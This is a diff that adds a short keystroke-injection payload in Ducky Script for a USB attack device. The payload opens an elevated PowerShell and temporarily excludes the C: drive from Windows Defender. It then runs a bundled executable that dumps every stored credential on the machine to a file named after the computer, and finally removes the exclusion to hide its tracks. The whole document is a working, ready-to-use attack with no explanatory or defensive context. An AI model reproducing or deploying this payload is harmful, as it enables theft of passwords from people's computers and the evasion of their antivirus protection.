@@ -1,0 +1,19 @@
+DELAY 2000
+ATTACKMODE HID STORAGE
+GUI x
+DELAY 200
+STRING a
+DELAY 700
+ALT y
+DELAY 900
+STRING powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:"
+ENTER
+DELAY 700
+STRING %DUCKY%\l.exe all | Out-File '%DUCKY%\%computername%_creds.txt';"
+ENTER
+DELAY 3000
+STRING powershell -inputformat none -outputformat none -NonInteractive -Command Remove-MpPreference -ExclusionPath "C:"
+ENTER
+DELAY 200
+STRING exit
+ENTER
